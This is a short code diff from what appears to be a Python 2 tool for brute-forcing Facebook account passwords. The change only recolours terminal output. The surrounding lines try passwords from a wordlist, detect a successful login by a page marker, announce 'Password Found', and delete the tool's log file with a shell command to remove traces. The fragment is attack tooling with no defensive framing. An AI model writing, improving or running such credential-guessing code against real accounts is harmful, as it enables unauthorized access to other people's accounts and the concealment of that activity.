@@ -58,12 +58,12 @@ for password in wordlist:
             dos.seek(0)
             text = dos.read().decode('UTF-8')
             if text.find('home_icon', 0, len(text)) != -1:
-                print '\033[1;92m[+] \033[1;31mPassword Found : '+password 
+                print '\033[1;97m[+] \033[1;31mPassword Found : '+password 
                 dos.close()
                 os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
                 exit()
             else:
-                print "\033[1;91m[+] \033[1;32mTrying Password : "+str(password)
+                print "\033[1;97m[+] \033[1;32mTrying Password : "+str(password)
         except KeyboardInterrupt:
             print '\n#############################################\n   Exiting..'
             dos.close()
